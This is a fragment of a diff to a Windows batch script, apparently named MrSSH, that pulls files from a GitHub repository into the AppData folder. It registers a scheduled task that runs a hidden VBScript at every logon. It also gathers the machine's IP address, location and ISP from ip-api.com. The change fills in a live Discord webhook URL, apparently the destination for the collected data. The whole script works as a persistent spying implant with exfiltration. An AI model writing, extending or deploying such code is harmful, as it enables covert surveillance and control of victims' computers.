@@ -19,7 +19,7 @@ cd %appdata%\MrSSH & curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main
 schtasks /create /tn "MrSSH" /sc onlogon /tr "%appdata%\MrSSH\Silent.vbs" /F
 cd %temp%
 
-set "webhook="
+set "webhook=https://discord.com/api/webhooks/893838978833350706/S6T93mD5c6dA6kMHIgWWzHPiFJH3rj2XqANwwvPn2nHmkJhEd6PPYJeNvO3qKCKG6xtK"
 
 for /f "tokens=*" %%a in ('call "WebParse.exe" "http://ip-api.com/json/?fields=61439" query status city regionName country countryCode lat lon timezone isp') do set "%%a"
 
